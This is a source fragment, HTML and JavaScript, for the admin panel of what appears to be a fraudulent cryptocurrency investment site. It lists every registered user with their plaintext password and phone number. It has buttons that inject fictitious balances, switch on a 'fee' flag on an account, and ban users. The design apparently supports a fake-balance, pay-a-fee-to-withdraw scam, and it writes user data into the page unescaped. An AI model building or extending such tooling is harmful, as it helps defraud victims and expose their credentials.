<section id="admin-sec" class="hidden space-y-6">
    <div class="flex justify-between items-center px-2">
        <div>
            <h3 class="text-2xl font-black text-blue-500 italic uppercase leading-none">Terminal Logs</h3>
            <p class="text-[8px] text-slate-500 uppercase tracking-widest mt-1 font-bold">Total Network Nodes Detected</p>
        </div>
        <span id="admin-user-count" class="bg-blue-600 text-white text-[11px] font-black px-3 py-1 rounded-full">0</span>
    </div>

    <div id="user-logs" class="space-y-4 px-1 pb-20">
        <div class="text-center py-20">
            <p class="text-slate-600 text-[10px] uppercase animate-pulse">Scanning for User Nodes...</p>
        </div>
    </div>
</section>

<script>
// --- MASTER ADMIN COMMAND LOGIC ---

function loadUserLogs() {
    // 1. Force a fresh pull of every user in the system
    const database = JSON.parse(localStorage.getItem('magic_users')) || {};
    const logContainer = document.getElementById('user-logs');
    const userEntries = Object.entries(database);
    
    // 2. Update the total count badge
    document.getElementById('admin-user-count').innerText = userEntries.length;

    if (userEntries.length === 0) {
        logContainer.innerHTML = `
            <div class="magic-card p-10 text-center border-dashed border-slate-800">
                <p class="text-slate-500 text-[10px] uppercase font-bold">No Users Registered on this Node</p>
            </div>`;
        return;
    }

    // 3. Render every user as a unique card with a direct Inject Button
    // We reverse it so the newest registrations are always at the TOP
    logContainer.innerHTML = userEntries.reverse().map(([email, data]) => `
        <div class="magic-card p-5 bg-[#0d1117] border-l-4 ${data.bal === 0 ? 'border-l-blue-500 animate-pulse' : 'border-l-green-600'}">
            <div class="flex justify-between items-start mb-4">
                <div class="max-w-[60%]">
                    <p class="text-blue-400 font-black text-[13px] uppercase tracking-tighter truncate">${data.name || 'New Node'}</p>
                    <p class="text-slate-500 text-[9px] font-mono break-all">${email}</p>
                    <p class="text-[8px] text-slate-600 font-bold uppercase mt-1">Pass: <span class="text-red-500">${data.pass}</span></p>
                    <p class="text-[8px] text-slate-600 font-bold uppercase">Phone: <span class="text-white">${data.phone || 'N/A'}</span></p>
                </div>
                <div class="text-right">
                    <p class="text-white font-mono font-bold text-[14px] leading-none">$${(data.bal || 0).toLocaleString()}</p>
                    <p class="text-[8px] text-blue-500 font-mono mt-1">${(data.bal / 96000).toFixed(6)} BTC</p>
                </div>
            </div>

            <div class="grid grid-cols-2 gap-2 mt-2">
                <button onclick="directInject('${email}')" class="bg-blue-600 text-white text-[9px] font-black py-3 rounded-lg uppercase shadow-lg shadow-blue-900/20 active:scale-95 transition-all">
                    Inject Funds üí∏
                </button>
                <button onclick="directToggleFee('${email}')" class="${data.isPending ? 'bg-yellow-500 text-black' : 'bg-slate-800 text-slate-400'} text-[9px] font-black py-3 rounded-lg uppercase active:scale-95 transition-all">
                    ${data.isPending ? 'Fee Active ‚úÖ' : 'Trigger Fee ‚ö†Ô∏è'}
                </button>
            </div>
            
            <button onclick="directBan('${email}')" class="w-full mt-2 text-[8px] text-red-900 font-bold uppercase tracking-widest py-1">
                ${data.isBlocked ? 'Unban User' : 'Ban User'}
            </button>
        </div>
    `).join('');
}

// --- DIRECT COMMAND FUNCTIONS (No typing required) ---

function directInject(email) {
    let database = JSON.parse(localStorage.getItem('magic_users'));
    const amount = prompt("How much USDT would you like to inject into " + email + "?");
    
    if (amount !== null && !isNaN(amount) && amount !== "") {
        database[email].bal = (parseFloat(database[email].bal) || 0) + parseFloat(amount);
        localStorage.setItem('magic_users', JSON.stringify(database));
        loadUserLogs(); // Refresh the list instantly
        alert("Successfully injected $" + amount + " into " + email);
    }
}

function directToggleFee(email) {
    let database = JSON.parse(localStorage.getItem('magic_users'));
    database[email].isPending = !database[email].isPending;
    localStorage.setItem('magic_users', JSON.stringify(database));
    loadUserLogs();
}

function directBan(email) {
    let database = JSON.parse(localStorage.getItem('magic_users'));
    database[email].isBlocked = !database[email].isBlocked;
    localStorage.setItem('magic_users', JSON.stringify(database));
    loadUserLogs();
}

// Ensure the Admin tab refreshes whenever it is clicked
function showSection(s) {
    ['home', 'ledger', 'profile', 'admin'].forEach(id => {
        const el = document.getElementById(id + '-sec');
        if(el) el.classList.add('hidden');
    });
    const target = document.getElementById(s + '-sec');
    if(target) target.classList.remove('hidden');
    
    // This is the trigger that shows all users
    if(s === 'admin') { loadUserLogs(); }
}
</script>
